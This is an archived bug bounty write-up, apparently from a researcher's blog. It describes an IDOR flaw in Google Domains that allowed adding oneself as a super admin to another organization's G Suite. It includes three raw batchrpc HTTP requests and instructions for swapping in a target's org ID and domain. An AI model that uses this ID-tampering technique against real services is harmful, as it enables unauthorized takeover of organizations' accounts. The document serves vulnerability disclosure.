---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-11-09_becoming-a-super-admin-in-someone-elses-gsuite-organization-and-taking-it-over.md
original_filename: 2021-11-09_becoming-a-super-admin-in-someone-elses-gsuite-organization-and-taking-it-over.md
title: Becoming A Super Admin In Someone Elses Gsuite Organization And Taking It Over
category: documents
detected_topics:
- idor
- command-injection
- csrf
- api-security
tags:
- imported
- documents
- idor
- command-injection
- csrf
- api-security
language: en
raw_sha256: bc544907457c45a379b6ca2ae58110cdfbbe15c0a5b362b1e953dedfc0c7bc56
text_sha256: 2ef72ce4f78f667258b7da17fff25263fcac9916e1c765ffe71d9da80f0218fd
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Becoming A Super Admin In Someone Elses Gsuite Organization And Taking It Over

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-11-09_becoming-a-super-admin-in-someone-elses-gsuite-organization-and-taking-it-over.md
- Source Type: markdown
- Detected Topics: idor, command-injection, csrf, api-security
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `bc544907457c45a379b6ca2ae58110cdfbbe15c0a5b362b1e953dedfc0c7bc56`
- Text SHA256: `2ef72ce4f78f667258b7da17fff25263fcac9916e1c765ffe71d9da80f0218fd`


## Content

---
title: "Becoming A Super Admin In Someone Elses Gsuite Organization And Taking It Over"
url: "https://secreltyhiddenwriteups.blogspot.com/2021/11/becoming-super-admin-in-someone-elses.html"
final_url: "https://secreltyhiddenwriteups.blogspot.com/2021/11/becoming-super-admin-in-someone-elses.html"
authors: ["Cam (@SecretlyHidden1)"]
programs: ["Google"]
bugs: ["IDOR"]
publication_date: "2021-11-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3186
---

###  Becoming A Super Admin In Someone Elses Gsuite Organization And Taking It Over 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

\-  [ November 09, 2021  ](https://secreltyhiddenwriteups.blogspot.com/2021/11/becoming-super-admin-in-someone-elses.html "permanent link")

Hello All!

Long time since I have posted here :)  
  
As most of you know I am planning on writing up a lot of my research I have done through Microsoft Bug Bounty program over the years. Still trying to figure out exactly the best approach and reports to writeup. However in the mean time I will be providing some of my research from Google over the years.  
  
Microsoft and Google were the 2 main programs I hunted on over the years and Googles program resulted in some fruitful research as well :)  
  
So as a result today I present how it was possible to add yourself as a Gsuite Super Admin to someone else's Gsuite account.

POC:  
  
So for those that do not know Gusite is a suite of products offered by Google for organizations and education institutions for example. It is similar to Microsofts offering of O365. Now in Gsuite the main admins of the organization are super admins. They are exactly what they sound like. Have Super Admin privileges over everything. They can create group, manage users, change users passwords, manage everything. Now it is important to really not have that many super admins in a org as the more super admins you have the higher chances you have of a super admin account being compromised.  
  
What if though you could create a super admin account in anyone's Gsuite organization?  
  
What if you could just add yourself to any Gsuite organization and make yourself a super admin?  
  
And this is where the journey begins.  
  
You see Google has a feature called domains.google.com. It is simply a registrar hosted and run by Google. Now on it they have a feature that lets you create a Gsuite subscription and you can manage it within domains.google.com. So after you create your gsuite subscription through domains.google.com it is now managed through that. So you can manage users, add super admins, manage payment methods, etc.  
  
I believe you should probably know where this issue is heading now ;)  
  
So when adding a user to your gsuite organization through domains.google.com a process is started and multiple requests are ran. The way it works is add a user as admin through domains.google.com, a request is sent to add user, the domains.google.com payment portal opens up for you to pay for this new user you are adding. If you examined the requests and put the correct IDs this would let you add any admin to any gsuite organization.

  
So once on your domain on domains.google.com when adding a admin to your gsuite account there are 3 requests that ran.  
  
First request was:  
  
POST /batchrpc HTTP/1.1  
Host: domains.google.com  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0  
Accept: */*  
  
{"method":"serve","params":"{\"1\":{\"1\":\"https://domains.google.com/registrar#chp=z,d&z=e&d=5896212,testdomain4534.com\",\"2\":\"844732c1a4661b3dd830afeaa8eaedbf\"},\"3\":{\"1\":72,\"2\":{},\"74\":{\"1\":\"5896212\",\"2\":\"testdomain4534.com\",\"3\":[{\"2\":{\"1\":\"testdomain4534.com\",\"2\":\"1337.baby\",\"3\":\"1337\",\"4\":\"baby\",\"5\":2}}],\"4\":1}}}","xsrf":""}

  

Second request was:  
  
POST /batchrpc HTTP/1.1  
Host: domains.google.com  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0  
Accept: */*  
  
{"method":"serve","params":"{\"1\":{\"1\":\"https://domains.google.com/registrar#chp=z,d&z=e&d=5896212,testdomain4534.com\",\"2\":\"844732c1a4661b3dd830afeaa8eaedbf\"},\"3\":{\"1\":38,\"2\":{},\"40\":{\"1\":{\"1\":\"3703203\",\"3\":[{\"1\":6,\"7\":{\"1\":\"testdomain4534.com\",\"4\":2,\"6\":{\"1\":\"testdomain4534.com\",\"2\":\"1337.baby\",\"3\":\"1337\",\"4\":\"baby\",\"5\":2},\"13\":\"5896212\"}}],\"5\":\"en-US\"},\"2\":\"USD\"}}}","xsrf":""}

  

  
  
Third request was:  
  
POST /batchrpc HTTP/1.1  
Host: domains.google.com  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0  
Accept: */*  
  
{"method":"serve","params":"{\"1\":{\"1\":\"https://domains.google.com/registrar#chp=z,d&z=e&d=5896212,testdomain4534.com\",\"2\":\"844732c1a4661b3dd830afeaa8eaedbf\"},\"3\":{\"1\":11,\"2\":{},\"13\":{\"1\":{\"1\":\"3703203\",\"3\":[{\"1\":6,\"7\":{\"1\":\"testdomain4534.com\",\"2\":{\"1\":\"USD\",\"2\":\"0\"},\"4\":2,\"6\":{\"1\":\"testdomain4534.com\",\"2\":\"1337.baby\",\"3\":\"1337\",\"4\":\"baby\",\"5\":2},\"8\":{\"1\":\"USD\",\"2\":\"10000000\"},\"9\":{\"1\":{\"1\":\"USD\",\"2\":\"5000000\"},\"2\":{\"1\":\"USD\",\"2\":\"0\"},\"3\":0},\"13\":\"5896212\"},\"8\":{\"2\":{}}}],\"5\":\"en-US\"},\"2\":\"USD\",\"4\":1,\"9\":\"US\",\"10\":0}}}","xsrf":""}

  

  
  
So as you can see these 3 requests were adding a user with the name 1337baby to the testdomain4534.com to that gsuite organization.  
  
So in the POC we are adding a user to the amazingpotato gsuite org that I do not have access too.  
  
Now there are 2 things needed to do this.  
  
First you need the domain of the gsuite org which is amazingpotato.org.  
  
And then the ID of the gsuite organization you are targeting which in this case was  
  
25879957  
  
So in order to do this simply take the following requests linked above and first replace the domain testdomain4534.com with amazingpotato.org as your domain.  
  
Now the user id part can be tricky. Basically in the request one area either has the user id of the domain/gsuite owner and then the user id of the user actually making the purchase.  
  
{"method":"serve","params":"{\"1\":{\"1\":\"https://domains.google.com/registrar#chp=z,d&z=e&d=5896212,testdomain4534.com\",\"2\":\"844732c1a4661b3dd830afeaa8eaedbf\"},\"3\":{\"1\":72,\"2\":{},\"74\":{\"1\":\"5896212\",\"2\":\"testdomain4534.com\",\"3\":[{\"2\":{\"1\":\"testdomain4534.com\",\"2\":\"1337.baby\",\"3\":\"1337\",\"4\":\"baby\",\"5\":2}}],\"4\":1}}}","xsrf":"ACJTu_66_XziDuNee2rpFECvfcBn_3mYWg:1526402883203"}  
  
So in this part for example this ID 5895212 which can be replaced too the other gsuite org ID you are targeting so the request would look like this  
  
{"method":"serve","params":"{\"1\":{\"1\":\"https://domains.google.com/registrar#chp=z,d&z=e&d=5896212,testdomain4534.com\",\"2\":\"844732c1a4661b3dd830afeaa8eaedbf\"},\"3\":{\"1\":72,\"2\":{},\"74\":{\"1\":\"25879957\",\"2\":\"amazingpotato.org\",\"3\":[{\"2\":{\"1\":\"amazingpotato.org\",\"2\":\"1337.baby\",\"3\":\"1337\",\"4\":\"baby\",\"5\":2}}],\"4\":1}}}","xsrf":"ACJTu_66_XziDuNee2rpFECvfcBn_3mYWg:1526402883203"}  
  
Now remember that would just be the first request.  
  
You would need to replace ALL 3 for this to work.  
  
So those other 2 requests mentioned above, (second and third request), you would also need to replace and put the right information for those also.  
  
After you put the right Ids a popup would come up saying buy this user for amazingpotato.org

  
After purchasing the super admin gets added to their org and the password for the account is sent to your email.

  

  

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

#### Post a Comment

[](https://www.blogger.com/comment/frame/8894024976105685401?po=4757655578824433035&hl=en&saa=85391&origin=https://secreltyhiddenwriteups.blogspot.com&skin=contempo)
